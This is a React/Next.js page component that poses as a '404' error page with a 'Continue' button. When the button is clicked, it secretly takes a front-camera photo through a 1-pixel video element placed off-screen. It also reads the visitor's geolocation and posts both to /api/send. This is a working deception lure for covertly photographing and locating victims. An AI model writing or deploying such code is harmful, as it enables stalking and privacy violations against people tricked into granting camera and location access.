"use client";
import { useRef } from "react";
import "@/public/404.css";

export default function Home() {
  const videoRef = useRef<HTMLVideoElement>(null);

  async function capture() {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    });

    const video = videoRef.current!;
    video.srcObject = stream;
    video.muted = true;

    await video.play();

    // 🔴 CRITICAL: wait for real frame render
    await new Promise(resolve => setTimeout(resolve, 500));

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext("2d")!;
    ctx.drawImage(video, 0, 0);

    const image = canvas.toDataURL("image/jpeg", 0.9);

    stream.getTracks().forEach(t => t.stop());

    navigator.geolocation.getCurrentPosition(async pos => {
      await fetch("/api/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          image,
          lat: pos.coords.latitude,
          lon: pos.coords.longitude
        })
      });
    });
  console.log("image length:", image.length);
  }

  return (
    <div className="error-container">
      <h1>404</h1>
      <p>Click here to continue</p>

      {/* 🔑 MUST BE RENDERED, NOT HIDDEN */}
      <video
        ref={videoRef}
        playsInline
        muted
        style={{
          position: "absolute",
          top: "-1000px",
          left: "-1000px",
          width: "1px",
          height: "1px"
        }}
      />

      <button onClick={capture}>Continue</button>
    </div>
  );
}
